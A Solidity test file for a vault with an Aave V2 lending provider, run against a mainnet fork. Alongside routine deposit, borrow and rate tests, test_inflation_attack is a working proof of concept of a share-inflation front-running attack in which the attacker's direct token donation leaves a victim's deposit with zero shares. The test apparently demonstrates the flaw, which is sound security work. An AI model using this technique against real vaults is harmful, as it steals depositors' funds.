// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/console.sol";
import {Routines} from "../../utils/Routines.sol";
import {ForkingSetup} from "../ForkingSetup.sol";
import {AaveV2} from "../../../src/providers/mainnet/AaveV2.sol";
import {ILendingProvider} from "../../../src/interfaces/ILendingProvider.sol";
import {BorrowingVault} from "../../../src/vaults/borrowing/BorrowingVault.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {IV2Pool} from "../../../src/interfaces/aaveV2/IV2Pool.sol";
import {BaseVault} from "../../../src/abstracts/BaseVault.sol";

contract AaveV2ForkingTestMainnet is Routines, ForkingSetup {
  ILendingProvider public aaveV2;

  uint256 public constant DEPOSIT_AMOUNT = 0.5 ether;
  uint256 public constant BORROW_AMOUNT = 200 * 1e6;

  function setUp() public {
    setUpFork(MAINNET_DOMAIN);

    aaveV2 = new AaveV2();
    ILendingProvider[] memory providers = new ILendingProvider[](1);
    providers[0] = aaveV2;

    deploy(providers);
  }

  function test_inflation_attack() public {
    address asset = vault.asset();
    IV2Pool aavePool = IV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IV2Pool.ReserveData memory rdata = aavePool.getReserveData(asset);
    IERC20 aToken = IERC20(rdata.aTokenAddress);

    /// ALICE - attacker prepare a lot of aToken 
    deal(asset, ALICE, 10 ether);
    vm.startPrank(ALICE);
    IERC20(asset).approve(address(aavePool), type(uint256).max);
    aavePool.deposit(vault.asset(), 10 ether, ALICE, 0);
    vm.stopPrank();

    // ALICE - attacker deposit 10^18 asset tokens into vault 
    // then withdraw 10^18-1 asset tokens to make the totalAsset = 1
    do_deposit(1 ether, vault, ALICE);
    do_withdraw(1 ether - 1, vault, ALICE);

    // the current price of vault now is 1 and totalAsset() = 1
    assertEq(vault.totalAssets(), 1);
    assertEq(vault.totalSupply(), 1);
    assertEq(vault.balanceOf(ALICE), 1);

    // BOB want to deposit into vault 1 ether but ALICE front-run it
    // ALICE transfer directly 1 ether into vault 
    vm.prank(ALICE);
    aToken.transfer(address(vault), 1 ether);

    // BOB deposit 1 ether to vault 
    deal(asset, BOB, 1 ether);
    vm.startPrank(BOB);
    IERC20(asset).approve(address(vault), 1 ether);
    vault.deposit(1 ether, BOB);
    vm.stopPrank();

    // BOB gain 0 share 
    assertEq(vault.balanceOf(BOB), 0);
    assertEq(vault.totalSupply(), 1);
    assertEq(vault.totalAssets(), 2 ether + 1);
  }

  function test_depositAndBorrow() public {
    do_deposit(DEPOSIT_AMOUNT, vault, ALICE);
    do_borrow(BORROW_AMOUNT, vault, ALICE);
  }

  function test_paybackAndWithdraw() public {
    deal(address(vault.asset()), ALICE, DEPOSIT_AMOUNT);

    do_depositAndBorrow(DEPOSIT_AMOUNT, BORROW_AMOUNT, vault, ALICE);

    vm.warp(block.timestamp + 13 seconds);
    vm.roll(block.number + 1);

    uint256 aliceDebt = vault.balanceOfDebt(ALICE);
    do_payback(aliceDebt, vault, ALICE);

    assertEq(vault.balanceOfDebt(ALICE), 0);

    uint256 maxAmount = vault.maxWithdraw(ALICE);
    do_withdraw(maxAmount, vault, ALICE);

    assertGe(IERC20(vault.asset()).balanceOf(ALICE), DEPOSIT_AMOUNT);
  }

  function test_getBalances() public {
    do_depositAndBorrow(DEPOSIT_AMOUNT, BORROW_AMOUNT, vault, ALICE);

    uint256 depositBalance = vault.totalAssets();
    uint256 borrowBalance = vault.totalDebt();
    assertGe(depositBalance, DEPOSIT_AMOUNT);
    assertGe(borrowBalance, BORROW_AMOUNT);
  }

  function test_getInterestRates() public {
    uint256 depositRate = aaveV2.getDepositRateFor(vault);
    assertGt(depositRate, 0); // Should be greater than zero.

    uint256 borrowRate = aaveV2.getBorrowRateFor(vault);
    assertGt(borrowRate, 0); // Should be greater than zero.
  }

  function test_twoDeposits() public {
    do_deposit(DEPOSIT_AMOUNT, vault, ALICE);
    do_deposit(DEPOSIT_AMOUNT, vault, BOB);
  }
}
